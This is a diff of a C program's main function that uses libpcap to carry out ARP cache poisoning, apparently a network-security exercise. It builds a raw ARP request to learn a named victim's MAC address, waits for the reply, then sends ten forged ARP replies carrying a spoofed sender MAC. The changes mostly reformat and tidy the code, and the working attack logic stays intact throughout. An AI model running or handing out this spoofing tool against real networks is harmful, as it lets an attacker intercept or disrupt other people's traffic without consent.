@@ -28,158 +28,142 @@ struct ARP_HEADER{
 };
 int main(int argc, char* argv[])
 {
-	char* dev;
-	char* errbuf[PCAP_ERRBUF_SIZE];
-	char* SourceMac;
-	struct ETHERNET_HEADER *ethernet;
-	struct ARP_HEADER *arp;
-	char *sender_ip;
-	char *target_ip;
-	u_int32_t sender;
-	u_int32_t target;
-	int i = 0;
-	int res;
-	struct bpf_program *fp;
-	struct pcap_pkthdr *header;
 
-	u_char* rev_packet;
-	pcap_t *handle;
-	u_char packet[42];
-	u_char* temp;
-	
-	if(argc == 1 || argc >4 ){
-		printf("%s [Interface] [Sender IP] [Victim IP]\n",argv[0]);
-		exit(1);
-	}
-	
-	printf("%s\n", argv[2]);
-	printf("%s\n", argv[3]);
-	inet_aton(argv[2], &sender);
-	inet_aton(argv[3], &target);	
-	ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
-	arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));
-	handle = pcap_open_live(argv[1], BUFSIZ, 0, -1, errbuf);
-	
-	//////////////////////////////////////////////
-	//////Making Packet to know Victim's MAC//////
-	//////////////////////////////////////////////
-	//////////Victim's IP : 192.168.43.204////////
-	//////////////////////////////////////////////
-	for (i = 0; i < 6; i++) {
-		packet[i] = 0xff;
-	}
-	packet[6] = 0x00;
-	packet[7] = 0x0c;
-	packet[8] = 0x29;
-	packet[9] = 0xac;
-	packet[10] = 0x4c;
-	packet[11] = 0xee;
-	packet[12] = 0x08;
-	packet[13] = 0x06;
-	
-	packet[14] = 0x00;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    struct ETHERNET_HEADER *ethernet;
+    struct ARP_HEADER *arp;
+    u_int32_t sender;
+    u_int32_t target;
+    int i = 0;
+    int res;
+    struct pcap_pkthdr *header;
+
+    const u_char* rev_packet;
+    pcap_t *handle;
+    u_char packet[42];
+
+
+    if(argc == 1 || argc >4 ){
+        printf("%s [Interface] [Sender IP] [Victim IP]\n",argv[0]);
+        exit(1);
+    }
+
+    printf("%s\n", argv[2]);
+    printf("%s\n", argv[3]);
+    sender = inet_addr(argv[2]);
+    target = inet_addr(argv[3]);
+    ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
+    arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));
+    handle = pcap_open_live(argv[1], BUFSIZ, 0, -1, errbuf);
+
+    //////////////////////////////////////////////
+    //////Making Packet to know Victim's MAC//////
+    //////////////////////////////////////////////
+
+    for (i = 0; i < 6; i++) {
+        packet[i] = 0xff;
+    }
+    packet[6] = 0x00;
+    packet[7] = 0x0c;
+    packet[8] = 0x29;
+    packet[9] = 0xac;
+    packet[10] = 0x4c;
+    packet[11] = 0xee;
+    packet[12] = 0x08;
+    packet[13] = 0x06;
+
+    packet[14] = 0x00;
     packet[15] = 0x01;
-	packet[16] = 0x08;
+    packet[16] = 0x08;
     packet[17] = 0x00;
-        
-	packet[18] = 0x06;
+
+    packet[18] = 0x06;
     packet[19]= 0x04;
-	packet[20] = 0x00;
+    packet[20] = 0x00;
     packet[21] = 0x01;
+    ///////////////////////////////////////
+    ////////Attacker Mac and IP////////////
+    ///////////////////////////////////////
     packet[22] = 0x00;
-	packet[23] = 0x0c;
-	packet[24] = 0x29;
-	packet[25] = 0xac;
-	packet[26] = 0x4d;
-	packet[27] = 0xee;
+    packet[23] = 0x0c;
+    packet[24] = 0x29;
+    packet[25] = 0xac;
+    packet[26] = 0x4d;
+    packet[27] = 0xee;
 
-       for(i=0; i<4; i++){
-		packet[28+i] = sender >> i*8;
-		printf("%x\n", packet[28+i]);
-	}/*
-    packet[28] = 192;
-    packet[29] = 168;
-    packet[30] = 127;
-    packet[31] = 135;*/
-           
-	packet[32] = 0x00;
-	packet[33] = 0x00;
-	packet[34] = 0x00;
-	packet[35] = 0x00;
-	packet[36] = 0x00;
-	packet[37] = 0x00;
-    /*
-	inet_pton(AF_INET, target_ip, &target.s_addr);
-	arp->Target_IP = target;
-    */
-	for(i=0;i<4; i++){
-		packet[38+i] = target >> i*8;
-		printf("%x\n", packet[38+i]);
-	}/*
-	packet[38] = 192;
-    packet[39] = 168;
-    packet[40] = 127;
-    packet[41] = 131;*/
-		pcap_sendpacket(handle, packet, 42);
-
-
-	///////////////////////////////////////////////////////
-	//////////////////Catch Packet/////////////////////////
-	///////////////////////////////////////////////////////
-
-	printf("Compile\n");	
-	//pcap_compile(handle, &fp, "ARP", 0, 0);
-	printf("SetFilter\n");
-//	pcap_setfilter(handle, &fp);
-	
-	while(1){
-		pcap_sendpacket(handle, packet,42);
-		res=pcap_next_ex(handle, &header, &rev_packet);
-		
-		if(res == 0){
-			continue;
-		}
-		else if(res == -1 || res == -2){
-			printf("res = -1 or -2 \n");
-			break;
-		}else{
-			ethernet = (struct ETHERNET_HEADER *)(rev_packet);
-			arp = (struct ARP_HEADER *)(rev_packet+ETHERNET_SIZE);
-			printf("%d\n", arp->Opcode);
-			if(arp->Opcode == 512){
-				printf("Find..!!\n");
-				break;
-			}
-				
-		
-		}
-
-	}
+    for(i=0; i<4; i++){
+        packet[28+i] = sender >> i*8;
+        printf("%x\n", packet[28+i]);
+    }
+    ////////////////////////////////////////
+    //////////Victim Mac and IP/////////////
+    ////////////////////////////////////////
+    packet[32] = 0x00;
+    packet[33] = 0x00;
+    packet[34] = 0x00;
+    packet[35] = 0x00;
+    packet[36] = 0x00;
+    packet[37] = 0x00;
+    for(i=0;i<4; i++){
+        packet[38+i] = target >> i*8;
+        printf("%x\n", packet[38+i]);
+    }
 
 
 
-	////////////////////////////////////////////////////////////
-	/////////////////////Sending Attack Packet//////////////////
-	////////////////////////////////////////////////////////////
 
-	for(i=0; i<6; i++){
-		packet[i] = ethernet->Source_Mac[i];
-		packet[32+i] = ethernet->Source_Mac[i];
-	}
+    ///////////////////////////////////////////////////////
+    //////////////////Catch Packet/////////////////////////
+    ///////////////////////////////////////////////////////
 
-	
+    while(1){
+        pcap_sendpacket(handle, packet,42);
+        res=pcap_next_ex(handle, &header, &rev_packet);
 
-	packet[22] = 0x00;
-	packet[23] = 0x50;
-	packet[24] = 0x56;
-	packet[25] = 0xf6;
-	packet[26] = 0x51;
-	packet[27] = 0x61;
-	for(i=0; i<10; i++){
-	pcap_sendpacket(handle, packet,42);
-	}
-	printf("Attack Finished..!\n");
+        if(res == 0){
+            continue;
+        }
+        else if(res == -1 || res == -2){
+            printf("res = -1 or -2 \n");
+            break;
+        }else{
+            ethernet = (struct ETHERNET_HEADER *)(rev_packet);
+            arp = (struct ARP_HEADER *)(rev_packet+ETHERNET_SIZE);
+            printf("%d\n", arp->Opcode);
+            if(arp->Opcode == 512){
+                printf("Found..!!\n");
+                break;
+            }
 
-	return 0;
+
+        }
+
+    }
+
+
+
+    ////////////////////////////////////////////////////////////
+    /////////////////////Sending Attack Packet//////////////////
+    ////////////////////////////////////////////////////////////
+
+    for(i=0; i<6; i++){
+        packet[i] = ethernet->Source_Mac[i];
+        packet[32+i] = ethernet->Source_Mac[i];
+    }
+
+
+
+    packet[22] = 0x00;
+    packet[23] = 0x50;
+    packet[24] = 0x56;
+    packet[25] = 0xf6;
+    packet[26] = 0x51;
+    packet[27] = 0x61;
+    for(i=0; i<10; i++){
+        pcap_sendpacket(handle, packet,42);
+    }
+    printf("Attack Finished..!\n");
+
+    return 0;
 }
 
